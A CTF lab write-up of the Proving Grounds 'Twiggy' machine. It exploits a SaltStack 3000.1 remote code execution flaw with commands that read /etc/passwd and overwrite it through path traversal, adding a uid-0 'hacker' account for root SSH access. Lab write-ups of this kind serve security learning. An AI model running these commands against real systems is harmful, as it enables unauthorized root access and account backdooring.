---
title: "Proving grounds Practice: Twiggy"
layout: post
date: 2023-08-27 01:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Practice
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```sh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
```

## Web
### PORT: 80

![img](/assets/images/CTF/Proving_Grounds/Twiggy/twiggy.png)

### PORT: 8000

![img](/assets/images/CTF/Proving_Grounds/Twiggy/8000.png)

The SaltStack Salt REST API is running.

![img](/assets/images/CTF/Proving_Grounds/Twiggy/salt.png)

SaltStack is vulnerable to [Saltstack 3000.1 - Remote Code Execution](https://www.exploit-db.com/exploits/48421)

## Exploitation

```sh
python exploit.py --master 192.168.174.62 --read /etc/passwd
```

![img](/assets/images/CTF/Proving_Grounds/Twiggy/read.png)

unable to obtain reverse shell using the `--exec` command in the exploit but we will be able to create and add our own new user account to the `/etc/passwd` file.

### Create new user

```sh
openssl passwd hacked
$1$iBeMKMaU$.O3VYqCZxUvapPL.OQ97/1
```

`hacked` is the password.

Add the following to the `/etc/passwd` content we have extracted from the attacking machine.

```text
hacker:$1$iBeMKMaU$.O3VYqCZxUvapPL.OQ97/1:0:0:root:/root:/bin/bash
```

**Writing /etc/passwd file**

```sh
python exploit.py --master 192.168.174.62 --upload-src passwd --upload-dest ../../../../../../../../../../etc/passwd
```

![img](/assets/images/CTF/Proving_Grounds/Twiggy/write.png)

**Verify the user existence**

![img](/assets/images/CTF/Proving_Grounds/Twiggy/verify.png)

SSH to the attacking machine using the username as `hacker` and password `hacked`.

![img](/assets/images/CTF/Proving_Grounds/Twiggy/root.png)

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr). 
